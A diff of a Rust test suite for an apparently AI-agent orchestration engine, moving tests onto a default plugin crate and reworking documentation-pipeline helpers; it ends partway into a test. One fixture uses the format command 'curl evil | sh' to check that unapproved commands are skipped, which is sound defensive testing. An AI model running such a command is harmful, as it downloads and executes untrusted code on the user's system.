@@ -7,6 +7,9 @@ use ostra_core::exec::{ExecutionResult, ExecutionStatus, Usage};
 use ostra_core::ids::{DecisionId, ExecutionId, GateId, SessionId};
 use ostra_core::pipeline::{Category, QuestionAnswer, StageKind, Track};
 use ostra_core::{AgentName, ExecutorKind};
+use ostra_default_plugin::data::OsExt;
+use ostra_default_plugin::inputs::OstraInputsExt;
+use ostra_default_plugin::prelude::*;
 use ostra_engine::plan::{PlanCtx, SpawnRequest, Step, next_steps};
 use ostra_engine::state::SessionState;
 use pretty_assertions::assert_eq;
@@ -52,6 +55,7 @@ impl H {
             uploads: vec![],
             pinned: vec![],
             docs_book: None,
+            workflow: None,
         });
         h
     }
@@ -66,7 +70,8 @@ impl H {
     }
 
     fn state(&self) -> SessionState {
-        SessionState::fold(self.id.clone(), &self.events)
+        ostra_default_plugin::install();
+        ostra_default_plugin::fold_session(self.id.clone(), &self.events)
     }
 
     fn steps(&self) -> Vec<Step> {
@@ -125,6 +130,7 @@ impl H {
         let req = self.spawn_step(prefix);
         let id = ExecutionId::new();
         self.ev(SessionEvent::ExecutionStarted {
+            projects: req.recorded_projects(),
             id: id.clone(),
             agent: req.agent,
             purpose: req.purpose.clone(),
@@ -136,6 +142,7 @@ impl H {
             spawn_block: String::new(),
             report_path: req.inputs.report_file.clone(),
             resumes: req.continues.clone(),
+            contract: None,
         });
         (id, req)
     }
@@ -195,7 +202,7 @@ impl H {
                 _ => None,
             })
             .expect("gate opened");
-        let routed = ostra_engine::state::answer_needs_route(&payload, &answer);
+        let routed = ostra_default_plugin::fold::answer_needs_route(&payload, &answer);
         self.answer_as(gate, answer, routed);
     }
 
@@ -314,7 +321,7 @@ impl H {
             &format!("spawn code-reviewer review phase {phase} #1"),
             review(&[]),
         );
-        let project = self.state().phases[&phase].info.project.clone();
+        let project = self.state().ext.os().phases[&phase].info.project.clone();
         self.command(CommandPurpose::Stage, &project);
     }
 }
@@ -396,7 +403,7 @@ fn p4_yolo_leaves_a_stopped_execution_to_the_user() {
     let g = h.open_gate("execution_failed");
     let st = h.state();
     assert_eq!(st.gates[&g].title, "You stopped generate-spec");
-    assert!(ostra_engine::judge_input::yolo_plan(&st, &g).is_none());
+    assert!(ostra_default_plugin::judge_input::yolo_plan(&st, &g).is_none());
     assert!(
         h.summaries().is_empty(),
         "no retry and no YOLO answer: {:?}",
@@ -535,7 +542,7 @@ fn d3_questions_before_fact_check_and_answers_rerun_spec() {
     assert_eq!(h.summaries(), vec![format!("judge route-answer {g}")]);
     h.deliver(&g);
     let rerun = h.spawn_step("spawn generate-spec");
-    assert_eq!(rerun.inputs.answers, answers);
+    assert_eq!(rerun.inputs.ox().answers, answers);
     assert!(
         rerun.inputs.spec_file.is_some(),
         "the rerun rewrites the spec in place"
@@ -560,6 +567,7 @@ fn d3a_prior_findings() {
     assert!(
         rerun
             .inputs
+            .ox()
             .findings
             .as_deref()
             .unwrap()
@@ -601,6 +609,7 @@ fn d3b_source_check() {
     assert_eq!(
         h.spawn_step("spawn fact-check")
             .inputs
+            .ox()
             .source_check
             .as_deref(),
         Some("refetch")
@@ -610,6 +619,7 @@ fn d3b_source_check() {
     assert_eq!(
         h.spawn_step("spawn fact-check")
             .inputs
+            .ox()
             .source_check
             .as_deref(),
         Some("citations")
@@ -620,6 +630,7 @@ fn d3b_source_check() {
     assert_eq!(
         h.spawn_step("spawn fact-check")
             .inputs
+            .ox()
             .source_check
             .as_deref(),
         Some("citations")
@@ -641,12 +652,12 @@ fn d4_plan_gets_only_the_spec() {
     );
     let plan = h.spawn_step("spawn plan");
     assert!(plan.inputs.research_docs.is_empty());
-    assert!(plan.inputs.answers.is_empty());
+    assert!(plan.inputs.ox().answers.is_empty());
     assert!(plan.inputs.task.is_none());
     // Rule D4a: what research found about the code arrives as the facts file, never the documents.
-    assert_eq!(plan.inputs.code_facts, h.state().research_docs());
-    assert!(plan.inputs.wants_code_facts_file());
-    assert!(plan.inputs.revise_phases.is_empty());
+    assert_eq!(plan.inputs.ox().code_facts, h.state().research_docs());
+    assert!(plan.inputs.ox().wants_code_facts_file(&plan.inputs));
+    assert!(plan.inputs.ox().revise_phases.is_empty());
     assert_eq!(
         plan.inputs.spec_file,
         Some(PathBuf::from("/ws/.ostra/sessions/s1/ostra-spec-1.md"))
@@ -665,15 +676,15 @@ fn d2a_spec_side_gets_what_changed_since_research() {
     assert_eq!(docs.len(), 1);
     let spec = h.spawn_step("spawn generate-spec");
     assert_eq!(spec.inputs.research_docs, docs);
-    assert_eq!(spec.inputs.code_facts, docs);
+    assert_eq!(spec.inputs.ox().code_facts, docs);
     assert!(
-        !spec.inputs.wants_code_facts_file(),
+        !spec.inputs.ox().wants_code_facts_file(&spec.inputs),
         "an agent that reads the documents gets only what changed"
     );
     h.run("spawn generate-spec", spec_submit(0, 0));
     let fc = h.spawn_step("spawn fact-check");
-    assert_eq!(fc.inputs.code_facts, docs);
-    assert!(!fc.inputs.wants_code_facts_file());
+    assert_eq!(fc.inputs.ox().code_facts, docs);
+    assert!(!fc.inputs.ox().wants_code_facts_file(&fc.inputs));
 }
 
 // ------------------------------------------------------------------------------------------
@@ -705,9 +716,9 @@ fn d4b_plan_revision_gets_the_phases_the_findings_name() {
         ]}),
     );
     let rerun = h.spawn_step("spawn plan");
-    assert_eq!(rerun.inputs.revise_phases, vec![1, 3]);
-    assert!(rerun.inputs.findings.is_some());
-    assert!(rerun.inputs.wants_code_facts_file());
+    assert_eq!(rerun.inputs.ox().revise_phases, vec![1, 3]);
+    assert!(rerun.inputs.ox().findings.is_some());
+    assert!(rerun.inputs.ox().wants_code_facts_file(&rerun.inputs));
 }
 
 #[test]
@@ -741,14 +752,14 @@ fn d5_plan_fact_check_and_approval() {
     );
     h.run("spawn plan", plan_submit(one_phase()));
     let fc = h.spawn_step("spawn fact-check fact-check-plan");
-    assert_eq!(fc.inputs.source_check.as_deref(), Some("citations"));
+    assert_eq!(fc.inputs.ox().source_check.as_deref(), Some("citations"));
     assert_eq!(
         fc.inputs.spec_file,
         Some(PathBuf::from("/ws/.ostra/sessions/s1/ostra-spec-1.md"))
     );
     assert!(fc.inputs.research_docs.is_empty());
     // Rule D4a: the plan fact-check checks against the facts the plan had.
-    assert!(fc.inputs.wants_code_facts_file());
+    assert!(fc.inputs.ox().wants_code_facts_file(&fc.inputs));
     h.run(
         "spawn fact-check fact-check-plan",
         fact("FAIL", "plan", &["phase 5 missing"]),
@@ -757,6 +768,7 @@ fn d5_plan_fact_check_and_approval() {
     assert!(
         rerun
             .inputs
+            .ox()
             .findings
             .as_deref()
             .unwrap()
@@ -789,7 +801,7 @@ fn approval_without_pass_is_ignored_by_the_fold() {
             feedback: None,
         },
     );
-    assert!(!h.state().spec.approved);
+    assert!(!h.state().ext.os().spec.approved);
 }
 
 // ------------------------------------------------------------------------------------------
@@ -928,7 +940,7 @@ fn t4_epa_fans_out_and_write_test_is_serial() {
     );
     let r = h.spawn_step("spawn code-reviewer");
     assert_eq!(r.inputs.phase_value.as_deref(), Some("1-tests"));
-    assert_eq!(r.inputs.epa_report, Some(PathBuf::from("/e1")));
+    assert_eq!(r.inputs.ox().epa_report, Some(PathBuf::from("/e1")));
     h.run("spawn code-reviewer", review(&[]));
     // Test files are staged per phase after that phase's test review passes.
     assert_eq!(h.summaries(), vec!["command stage p"]);
@@ -1010,10 +1022,10 @@ fn a1_an_unapproved_format_command_is_skipped_once() {
         project: "p".into(),
         command: "curl evil | sh".into(),
         exit_code: None,
-        output_tail: ostra_engine::runner::FORMAT_NOT_APPROVED.into(),
+        output_tail: ostra_default_plugin::FORMAT_NOT_APPROVED.into(),
     });
     let st = h.state();
-    assert_eq!(st.project_tracks["p"].format, Some(None));
+    assert_eq!(st.ext.os().project_tracks["p"].format, Some(None));
     assert!(
         !h.summaries()
             .iter()
@@ -1088,7 +1100,7 @@ fn d9_blocked_phase_removes_dependents() {
     assert!(s.contains(&"blocked phase 1".to_string()));
     assert!(s.contains(&"spawn implementer phase 3 initial".to_string()));
     assert!(!s.iter().any(|x| x.contains("phase 2")));
-    assert!(ostra_engine::plan::removed_phases(&h.state()).contains(&2));
+    assert!(ostra_default_plugin::planner::removed_phases(&h.state()).contains(&2));
 }
 
 // ------------------------------------------------------------------------------------------
@@ -1119,7 +1131,7 @@ fn d10_change_at_plan_approval_goes_to_spec() {
     h.deliver(&g);
     let spec = h.spawn_step("spawn generate-spec");
     assert_eq!(
-        spec.inputs.changes,
+        spec.inputs.ox().changes,
         vec!["Drop the retry logic".to_string()]
     );
     h.run("spawn generate-spec", spec_submit(0, 0));
@@ -1137,7 +1149,7 @@ fn d10_change_at_plan_approval_goes_to_spec() {
     );
     let plan = h.spawn_step("spawn plan");
     assert!(
-        plan.inputs.findings.is_none(),
+        plan.inputs.ox().findings.is_none(),
         "a spec-change revision, not a FAIL re-run"
     );
     assert!(
@@ -1158,7 +1170,7 @@ fn d10_spec_revision_gets_only_new_input() {
     let mut h = H::explored(&["p"], SessionOptions::default());
     let first = h.spawn_step("spawn generate-spec");
     assert!(
-        first.inputs.new_research_docs.is_empty(),
+        first.inputs.ox().new_research_docs.is_empty(),
         "a first run reads every research document"
     );
     h.run("spawn generate-spec", spec_submit(0, 0));
@@ -1173,12 +1185,15 @@ fn d10_spec_revision_gets_only_new_input() {
     );
     h.deliver(&g);
     let rev = h.spawn_step("spawn generate-spec");
-    assert_eq!(rev.inputs.changes, vec!["Drop the retry logic".to_string()]);
+    assert_eq!(
+        rev.inputs.ox().changes,
+        vec!["Drop the retry logic".to_string()]
+    );
     h.run("spawn generate-spec", spec_submit(0, 0));
     h.run("spawn fact-check", fact("FAIL", "spec", &["x"]));
     let fix = h.spawn_step("spawn generate-spec");
     assert!(
-        fix.inputs.changes.is_empty(),
+        fix.inputs.ox().changes.is_empty(),
         "an applied change is not sent again"
     );
     h.run("spawn generate-spec", spec_submit(0, 0));
@@ -1192,9 +1207,9 @@ fn d10_spec_revision_gets_only_new_input() {
     h.run("spawn explore explore#1", explore_submit(1, &[]));
     let amended = h.spawn_step("spawn generate-spec");
     assert_eq!(amended.inputs.research_docs.len(), 2);
-    assert_eq!(amended.inputs.new_research_docs.len(), 1);
+    assert_eq!(amended.inputs.ox().new_research_docs.len(), 1);
     assert_eq!(
-        amended.inputs.changes,
+        amended.inputs.ox().changes,
         vec!["The user extended the request: also handle refunds".to_string()]
     );
 }
@@ -1340,7 +1355,7 @@ fn queued_context_lets_running_work_finish() {
     h.run("spawn explore explore#1", explore_submit(1, &[]));
     let revision = h.spawn_step("spawn generate-spec");
     assert_eq!(
-        revision.inputs.changes,
+        revision.inputs.ox().changes,
         vec!["The user extended the request: also refunds".to_string()]
     );
 }
@@ -1403,8 +1418,8 @@ fn c2_discarded_context_reaches_no_agent() {
         json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "discard"}], "research": [], "reason": "r"}),
     );
     let rerun = h.spawn_step("spawn generate-spec");
-    assert!(!rerun.inputs.task.unwrap().contains("a typo"));
-    assert!(rerun.inputs.changes.is_empty());
+    assert!(!rerun.inputs.task.clone().unwrap().contains("a typo"));
+    assert!(rerun.inputs.ox().changes.is_empty());
 }
 
 #[test]
@@ -1422,7 +1437,7 @@ fn c2_context_that_changes_no_requirement_leaves_the_spec() {
         json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "deliver"}], "research": [], "reason": "r"}),
     );
     let st = h.state();
-    assert!(st.spec.approved, "the approved spec stands");
+    assert!(st.ext.os().spec.approved, "the approved spec stands");
     assert!(st.full_request().contains("name the module orders_cancel"));
 }
 
@@ -1443,7 +1458,7 @@ fn c2_remembered_context_becomes_a_note_for_later_stages() {
     let st = h.state();
     assert!(!st.full_request().contains("real database"));
     assert_eq!(
-        st.notes_for(ostra_engine::judge::NoteStage::Tests),
+        st.notes_for(ostra_default_plugin::judge::NoteStage::Tests),
         vec!["Test with a real database.".to_string()]
     );
 }
@@ -1525,7 +1540,11 @@ fn u2_a_correction_resumes_the_run_in_place() {
     h.ev(SessionEvent::ExecutionResumed { id: spec.clone() });
     let st = h.state();
     assert!(st.steers.is_empty());
-    assert_eq!(st.spec.runs, vec![spec], "a correction is not a new run");
+    assert_eq!(
+        st.ext.os().spec.runs,
+        vec![spec],
+        "a correction is not a new run"
+    );
 }
 
 #[test]
@@ -1670,7 +1689,7 @@ fn p2_a_resume_continues_the_same_execution() {
     let running: Vec<_> = st.running_executions().map(|r| r.id.clone()).collect();
     assert_eq!(running, vec![spec.clone()]);
     assert_eq!(
-        st.spec.runs,
+        st.ext.os().spec.runs,
         vec![spec.clone()],
         "a resume is not a new run"
     );
@@ -1684,7 +1703,7 @@ fn p2_a_resume_continues_the_same_execution() {
 fn p2_a_resumed_work_run_is_not_counted_twice() {
     let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
     let (id, _) = h.start("spawn implementer");
-    let work = |h: &H| h.state().phases[&1].impl_loop.work_count;
+    let work = |h: &H| h.state().ext.os().phases[&1].impl_loop.work_count;
     let before = work(&h);
     h.ev(SessionEvent::SessionPaused);
     h.finish(&id, ExecutionStatus::Interrupted, None);
@@ -1692,7 +1711,7 @@ fn p2_a_resumed_work_run_is_not_counted_twice() {
     assert_eq!(h.spawn_step("spawn implementer").resumes, Some(id.clone()));
     h.ev(SessionEvent::ExecutionResumed { id: id.clone() });
     assert_eq!(work(&h), before);
-    assert_eq!(h.state().phases[&1].impl_loop.running, Some(id));
+    assert_eq!(h.state().ext.os().phases[&1].impl_loop.running, Some(id));
 }
 
 #[test]
@@ -1732,6 +1751,7 @@ fn a_run_started_during_the_pause_is_interrupted_too() {
     h.ev(SessionEvent::SessionPaused);
     let id = ExecutionId::new();
     h.ev(SessionEvent::ExecutionStarted {
+        projects: Vec::new(),
         id: id.clone(),
         agent: req.agent,
         purpose: req.purpose.clone(),
@@ -1743,6 +1763,7 @@ fn a_run_started_during_the_pause_is_interrupted_too() {
         spawn_block: String::new(),
         report_path: None,
         resumes: None,
+        contract: None,
     });
     assert_eq!(
         h.state().interrupting.get(&id),
@@ -1837,7 +1858,7 @@ fn hard13_phase_spawns_carry_the_phase_file() {
     h.run("spawn implementer", impl_submit(1, &["src/a.rs"]));
     let rev = h.spawn_step("spawn code-reviewer");
     assert!(rev.inputs.phase.as_ref().unwrap().file.is_some());
-    assert_eq!(rev.inputs.changed_files, vec!["src/a.rs".to_string()]);
+    assert_eq!(rev.inputs.ox().changed_files, vec!["src/a.rs".to_string()]);
     assert_eq!(rev.inputs.phase_value.as_deref(), Some("1"));
 }
 
@@ -1850,15 +1871,17 @@ fn staging_after_review_passes() {
     );
     h.run("spawn code-reviewer", review(&[]));
     let steps = h.steps();
-    let Some(Step::Command {
+    let Some(ostra_default_plugin::steps::OstraStep::Command {
         purpose: CommandPurpose::Stage,
         files,
         ..
-    }) = steps.first()
+    }) = steps
+        .first()
+        .and_then(ostra_default_plugin::steps::OstraStep::of)
     else {
         panic!("{:?}", h.summaries())
     };
-    assert_eq!(files, &vec!["src/a.rs".to_string(), "src/b.rs".to_string()]);
+    assert_eq!(files, vec!["src/a.rs".to_string(), "src/b.rs".to_string()]);
 }
 
 #[test]
@@ -1883,13 +1906,14 @@ fn review_loop_splits_autofix_fix_and_caps_at_three() {
         failed: vec![],
     });
     let fix = h.spawn_step("spawn implementer phase 1 fix");
-    let text = fix.inputs.instructions.unwrap();
+    let text = fix.inputs.instructions.clone().unwrap();
     assert!(
         text.contains("PHASE-REQ-1") && !text.contains("C9"),
         "only HIGH and MEDIUM go to the fix agent"
     );
     assert!(
         fix.inputs
+            .ox()
             .ledger_file
             .unwrap()
             .ends_with("ostra-review-ledger-phase-1.md")
@@ -2069,8 +2093,8 @@ fn o7_stuck_environment_goes_to_the_advisor_then_reruns_with_its_guidance() {
     let id = stuck_env(&mut h, "spawn implementer");
     assert_eq!(h.summaries(), vec!["spawn advisor advise p #1"]);
     let adv = h.spawn_step("spawn advisor");
-    assert!(adv.inputs.init["Problem"].contains("EROFS"));
-    assert_eq!(adv.inputs.init["Failed step"], "implementer");
+    assert!(adv.inputs.ox().init["Problem"].contains("EROFS"));
+    assert_eq!(adv.inputs.ox().init["Failed step"], "implementer");
     assert!(matches!(&adv.purpose, ExecPurpose::Advise { execution, .. } if *execution == id));
     let (a, _) = h.start("spawn advisor");
     assert_eq!(
@@ -2126,7 +2150,7 @@ fn o7_after_max_advice_rounds_advise_becomes_the_gate() {
     );
     stuck_env(&mut h, "spawn implementer phase 1 rescue");
     let adv = h.spawn_step("spawn advisor");
-    assert!(adv.inputs.init["Earlier guidance"].contains("g1"));
+    assert!(adv.inputs.ox().init["Earlier guidance"].contains("g1"));
     h.run(
         "spawn advisor",
         json!({"action": "retry", "guidance": "g2", "reason": "r"}),
@@ -2155,7 +2179,7 @@ fn o7_a_stuck_test_run_shows_its_advisor_on_the_test_card() {
     stuck_env(&mut h, "spawn write-test write-test phase 1 initial");
     let (a, _) = h.start("spawn advisor");
     let st = h.state();
-    let card = ostra_engine::view::stages(&st)
+    let card = ostra_default_plugin::view::stages(&st)
         .into_iter()
         .find(|c| c.stage == StageKind::WriteTest)
         .unwrap();
@@ -2216,7 +2240,7 @@ fn o8_a_fix_sends_an_implementer_then_the_stuck_run_continues() {
         vec![] as Vec<String>,
         "nothing starts while the fix runs"
     );
-    let card = ostra_engine::view::stages(&h.state())
+    let card = ostra_default_plugin::view::stages(&h.state())
         .into_iter()
         .find(|c| c.stage == StageKind::Implement)
         .unwrap();
@@ -2239,7 +2263,7 @@ fn o8_a_fix_sends_an_implementer_then_the_stuck_run_continues() {
             && ctx.contains("gen/client.ts")
     );
     assert!(
-        h.state().phases[&1]
+        h.state().ext.os().phases[&1]
             .impl_loop
             .changed
             .contains("gen/client.ts")
@@ -2252,7 +2276,7 @@ fn o8_a_fix_answer_skips_the_route_judge() {
     let (_, g) = stuck_gate(&mut h, "spawn implementer");
     let st = h.state();
     let payload = &st.gates[&g].payload;
-    assert!(!ostra_engine::state::answer_needs_route(
+    assert!(!ostra_default_plugin::fold::answer_needs_route(
         payload,
         &fix(Some("x"))
     ));
@@ -2298,7 +2322,7 @@ fn o8_an_interrupted_fix_runs_again() {
 
 #[test]
 fn o8_yolo_always_sends_a_fix() {
-    use ostra_engine::judge_input::{YoloPlan, yolo_plan};
+    use ostra_default_plugin::judge_input::{YoloPlan, yolo_plan};
     let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
     let (_, mut g) = stuck_gate(&mut h, "spawn implementer");
     for _ in 0..4 {
@@ -2479,7 +2503,9 @@ fn quick_answer_is_forced_native() {
         h.state().forced_executor(AgentName::QuickAnswer),
         Some(ExecutorKind::Native)
     );
-    assert_eq!(h.state().forced_executor(AgentName::Explore), None);
+    // The session is what runs natively, whichever agent answers it.
+    let other = H::explored(&["p"], SessionOptions::default());
+    assert_eq!(other.state().forced_executor(AgentName::QuickAnswer), None);
 }
 
 // Quick change: one implementer pass on the native executor, staged, then completion.
@@ -2532,102 +2558,107 @@ fn test_category_skips_the_closing_gate() {
 // Documentation books (Rules B1 to B7).
 // ------------------------------------------------------------------------------------------
 
-fn docs_submit(project: &str) -> Value {
+fn page_submit(project: &str, id: &str, body: &str) -> Value {
     json!({
-        "status": "ok",
-        "summary": format!("Documented {project}."),
-        "overview": format!("{project} serves orders."),
-        "sections": [{
-            "id": format!("{project}-orders"),
-            "title": "Orders",
-            "purpose": "Creates and cancels orders.",
-            "boundaries": {"owns": ["orders table"], "does_not_own": ["payments, owned by billing"]},
-            "assumptions": ["Callers are authenticated by the gateway."],
-            "business_flow": [{"actor": "Customer", "action": "cancels an order", "outcome": "the order is cancelled"}],
-            "diagrams": [{"title": "Cancel", "kind": "sequence", "source": "sequenceDiagram\nC->>API: POST /orders/1/cancel\nAPI-->>C: 204"}],
-            "tables": [],
-            "concerns": [{"component": "OrderService", "responsibility": "state changes"}],
-            "code_refs": [{"path": "src/orders.rs", "symbol": "cancel", "note": "the handler"}],
-            "subsections": []
-        }],
+        "status": "ok", "step": "page", "summary": format!("Wrote {id}."),
+        "sections": [{"id": id, "title": "Orders", "summary": "Creates and cancels orders.", "body": format!("{body}\n\n```rust\nfn cancel(order: &mut Order) {{ ... }}\n```"),
+            "code_refs": [{"path": "src/orders.rs", "symbol": "cancel", "note": "the handler"}]}],
         "glossary": [{"term": "Order", "definition": format!("A purchase in {project}.")}]
     })
 }
 
-fn arch_submit() -> Value {
+fn survey_submit(project: &str, pages: &[(&str, bool)]) -> Value {
     json!({
-        "status": "ok",
-        "summary": "Two services.",
-        "architecture": {
-            "overview": "The web app calls the API.",
-            "diagram": {"title": "Components", "kind": "flowchart", "source": "flowchart LR\nweb -->|HTTP| api"},
-            "components": [{"name": "web", "project": "a", "role": "UI", "owns": []}, {"name": "api", "project": "b", "role": "API", "owns": ["orders"]}],
-            "links": [{"from": "web", "to": "api", "protocol": "HTTP/JSON", "mode": "sync", "payload": "Order"}],
-            "failure_recovery": [{"failure": "api down", "detection": "health check", "recovery": "restart"}],
-            "scalability": [{"component": "api", "scales_by": "replicas", "limit": "database connections"}]
-        },
-        "glossary": []
+        "status": "ok", "step": "survey", "summary": "Surveyed.", "overview": format!("{project} serves orders."),
+        "pages": pages.iter().map(|(id, rewrite)| json!({"id": id, "title": id, "group": "How it works", "covers": "It.", "rewrite": rewrite})).collect::<Vec<_>>(),
+        "inventory": pages.iter().map(|(id, _)| json!({"id": format!("{id}-item"), "name": id, "sources": ["src/"], "owner": id})).collect::<Vec<_>>()
     })
 }
 
-/// A DOCS session whose projects are measured small, so each gets one writer (Rule B9).
-fn docs_session(projects: &[&str]) -> H {
-    let mut h = docs_session_unplanned(projects);
-    for p in projects {
-        plan_docs(&mut h, p, vec![]);
+fn check_submit(pass: bool) -> Value {
+    if pass {
+        json!({"verdict": "PASS", "target": "page", "findings": []})
+    } else {
+        json!({"verdict": "FAIL", "target": "page", "findings": [{"severity": "HIGH", "claim": "The cap is 9.", "issue": "The code says 4.", "location": "src/orders.rs:3"}]})
     }
-    h
 }
 
-fn docs_session_unplanned(projects: &[&str]) -> H {
+fn synthesis_submit(done: bool, edits: Vec<(&str, &str)>) -> Value {
+    json!({
+        "status": "ok", "step": "synthesis", "summary": "Synthesized.", "done": done,
+        "checks": [{"check": "One owner per fact", "passed": done, "note": ""}],
+        "edits": edits.iter().map(|(p, i)| json!({"page": p, "instructions": [i]})).collect::<Vec<_>>()
+    })
+}
+
+const CLEAN: &str = "The service cancels an order before it ships.";
+
+/// One project's docs pipeline to the end: a survey of one page, its draft, a passing check, and
+/// a synthesis pass that finds the book done.
+fn finish_docs(h: &mut H, project: &str) {
+    if h.summaries().contains(&format!("scan-docs {project}")) {
+        h.ev(scanned(project, &[], &[]));
+    }
+    h.run(
+        &format!("spawn documentation docs-survey {project}"),
+        survey_submit(project, &[("orders", true)]),
+    );
+    h.run(
+        &format!("spawn documentation docs {project}/orders"),
+        page_submit(project, "orders", CLEAN),
+    );
+    h.run(
+        &format!("spawn fact-check docs-check {project}/orders round 1"),
+        check_submit(true),
+    );
+    h.run(
+        &format!("spawn documentation docs-synthesis {project} round 1"),
+        synthesis_submit(true, vec![]),
+    );
+}
+
+fn scanned(project: &str, modules: &[&str], refs: &[&str]) -> SessionEvent {
+    SessionEvent::DocsScanned {
+        project: project.into(),
+        modules: modules
+            .iter()
+            .map(|m| ostra_core::book::DocsModule {
+                name: m.to_string(),
+                globs: vec![format!("{m}/**")],
+            })
+            .collect(),
+        refs: refs
+            .iter()
+            .map(|r| ostra_core::book::RefItem {
+                name: r.to_string(),
+                file: "src/lib.rs".into(),
+            })
+            .collect(),
+        session_wide: false,
+    }
+}
+
+/// A DOCS session whose projects are already scanned, with no modules or constants.
+fn docs_session(projects: &[&str]) -> H {
     let mut h = H::new(projects, SessionOptions::default());
     h.decide(JudgeKind::Classify, None, json!({"category": "DOCS", "projects": projects, "explore_tasks": [], "opts_in": {"tests": false, "docs": true}, "reason": "r"}));
-    h
-}
-
-fn plan_docs(h: &mut H, project: &str, areas: Vec<ostra_core::book::DocsArea>) {
-    plan_docs_with(h, project, areas, None, vec![]);
-}
-
-fn plan_docs_with(
-    h: &mut H,
-    project: &str,
-    areas: Vec<ostra_core::book::DocsArea>,
-    existing: Option<Vec<String>>,
-    touched: Vec<String>,
-) {
-    h.ev(SessionEvent::DocsPlanned {
-        project: project.into(),
-        areas,
-        existing,
-        touched,
-    });
-}
-
-fn area(id: &str) -> ostra_core::book::DocsArea {
-    ostra_core::book::DocsArea {
-        id: id.into(),
-        title: id.into(),
-        globs: vec![format!("{id}/**")],
-        rest: false,
-        bytes: 600 * 1024,
+    for p in projects {
+        h.ev(scanned(p, &[], &[]));
     }
+    h
 }
 
 #[test]
 fn docs_category_skips_the_closing_gate() {
-    let mut h = docs_session_unplanned(&["p"]);
+    let mut h = docs_session(&["p"]);
     assert_eq!(h.state().category, Some(Category::Docs));
-    // Rule B9: the project is measured before its first writer.
-    assert_eq!(h.summaries(), vec!["plan-docs p"]);
-    plan_docs(&mut h, "p", vec![]);
-    assert_eq!(h.summaries(), vec!["spawn documentation docs p"]);
+    assert_eq!(h.summaries(), vec!["spawn documentation docs-survey p"]);
     let r = h.spawn_step("spawn documentation");
     assert_eq!(
-        r.inputs.implementer_reports,
+        r.inputs.ox().implementer_reports,
         vec![root().join("p").join("ostra-docs-request.md")]
     );
-    h.run("spawn documentation docs p", docs_submit("p"));
+    finish_docs(&mut h, "p");
     // Rule B4: one project, so no architecture; Rule B5: the engine writes the book.
     assert_eq!(h.summaries(), vec!["write-book p"]);
     h.ev(SessionEvent::BookWritten {
@@ -2641,242 +2672,633 @@ fn docs_category_skips_the_closing_gate() {
 #[test]
 fn b1_a_docs_run_without_a_readable_submit_fails() {
     let mut h = docs_session(&["p"]);
-    let (id, _) = h.start("spawn documentation docs p");
+    let (id, _) = h.start("spawn documentation docs-survey p");
     h.finish(&id, ExecutionStatus::Ok, None);
     assert_eq!(h.summaries(), vec!["gate execution_failed"]);
 }
 
 #[test]
-fn b7_docs_writers_fan_out_under_a_cap() {
+fn b7_docs_runs_fan_out_and_the_slot_limit_bounds_them() {
     let projects = ["a", "b", "c", "d", "e", "f"];
-    let mut h = docs_session(&projects);
-    let spawns: Vec<String> = h
-        .summaries()
-        .into_iter()
-        .filter(|s| s.starts_with("spawn documentation"))
-        .collect();
-    assert_eq!(spawns.len(), ostra_engine::plan::MAX_DOCS_WRITERS);
-    let (id, _) = h.start("spawn documentation docs a");
-    for p in ["b", "c", "d"] {
-        h.start(&format!("spawn documentation docs {p}"));
-    }
+    let h = docs_session(&projects);
     assert_eq!(
         h.summaries(),
-        vec![] as Vec<String>,
-        "the cap holds while four run"
+        projects
+            .iter()
+            .map(|p| format!("spawn documentation docs-survey {p}"))
+            .collect::<Vec<_>>(),
+        "the planner caps nothing; the runner's slots for limits.max_parallel_executions do"
     );
-    h.finish(&id, ExecutionStatus::Ok, Some(docs_submit("a")));
-    assert_eq!(h.summaries(), vec!["spawn documentation docs e"]);
 }
 
 #[test]
-fn b9_a_large_projects_areas_each_get_a_writer() {
-    let mut h = docs_session_unplanned(&["p"]);
-    plan_docs(&mut h, "p", vec![area("core"), area("web")]);
+fn b2_the_docs_writer_gets_the_users_request_and_notes() {
+    let h = docs_session(&["p"]);
+    let r = h.spawn_step("spawn documentation docs-survey p");
+    assert_eq!(
+        r.inputs.ox().implementer_reports,
+        vec![root().join("p").join("ostra-docs-request.md")],
+        "the request is the writer's implementer report"
+    );
+    assert_eq!(
+        r.inputs.user_notes,
+        h.state()
+            .notes_for(ostra_default_plugin::judge::NoteStage::Docs)
+    );
+}
+
+#[test]
+fn b1_the_pipeline_documents_a_project_after_a_build() {
+    let mut h = H::plan_approved(
+        &["p"],
+        one_phase(),
+        SessionOptions {
+            docs: true,
+            tests: false,
+            yolo: false,
+            track: None,
+        },
+    );
+    h.run("spawn implementer", impl_submit(1, &["web/app.ts"]));
+    h.run("spawn code-reviewer", review(&[]));
+    h.command(CommandPurpose::Stage, "p");
+    h.accept();
+    h.command(CommandPurpose::Format, "p");
+    let g = h.open_gate("closing_gate");
+    h.answer(
+        &g,
+        GateAnswer::Closing {
+            items: vec![ClosingChoice {
+                project: "p".into(),
+                tests: false,
+                docs: true,
+            }],
+        },
+    );
+    assert_eq!(h.summaries(), vec!["scan-docs p"]);
+    finish_docs(&mut h, "p");
+    assert_eq!(h.summaries(), vec!["write-book p"]);
+}
+
+#[test]
+fn b9_a_log_that_split_a_part_into_areas_still_folds() {
+    let mut h = docs_session(&["p"]);
+    let old: SessionEvent = serde_json::from_value(json!({
+        "type": "docs_planned", "project": "p",
+        "areas": [{"id": "core", "title": "core", "globs": ["core/**"], "rest": false, "bytes": 1}],
+        "existing": null, "touched": []
+    }))
+    .unwrap();
+    h.ev(old);
+    assert_eq!(h.summaries(), vec!["spawn documentation docs-survey p"]);
+}
+
+#[test]
+fn b10_the_scan_runs_before_the_survey() {
+    let mut h = H::new(&["p"], SessionOptions::default());
+    h.decide(JudgeKind::Classify, None, json!({"category": "DOCS", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": true}, "reason": "r"}));
+    assert_eq!(h.summaries(), vec!["scan-docs p"]);
+    h.ev(scanned("p", &["web"], &["MAX_SLOTS"]));
+    assert_eq!(h.summaries(), vec!["spawn documentation docs-survey p"]);
+    let r = h.spawn_step("spawn documentation docs-survey p");
+    assert_eq!(
+        r.inputs.ox().docs_reference,
+        Some(root().join("ostra-docs-drafts/p/reference.md"))
+    );
+}
+
+#[test]
+fn b10_the_engine_sends_a_page_back_for_its_user_block_owner_link_and_excerpt() {
+    let mut h = docs_session(&["p"]);
+    h.ev(scanned("p", &[], &[]));
